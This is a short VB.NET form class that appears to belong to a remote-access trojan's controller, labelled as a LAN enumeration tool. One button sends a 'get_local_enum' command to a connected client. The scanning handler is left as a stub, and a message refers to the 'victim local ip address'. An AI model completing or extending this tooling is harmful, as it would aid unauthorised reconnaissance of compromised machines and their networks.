Public Class Lan_Eunumeriation_Tool
    Public key As String
    
    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Form1.Send_to_Client("get_local_enum" & FUNC.SPL & "" & FUNC.SPL & "" & FUNC.SPL, key)
        'please depend on your self and complete that code ;) 
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        If TextBox1.Text.Length > 1 Then
            ' do here some stuff / send to vbs command to start scanning And also handle receive and put them in tha tree view 
        Else
            MsgBox("Enter Valid ip address of client pc" & vbNewLine & "Hint : victim local ip address in LAN from the above received list", MsgBoxStyle.Critical)
        End If
    End Sub

End Class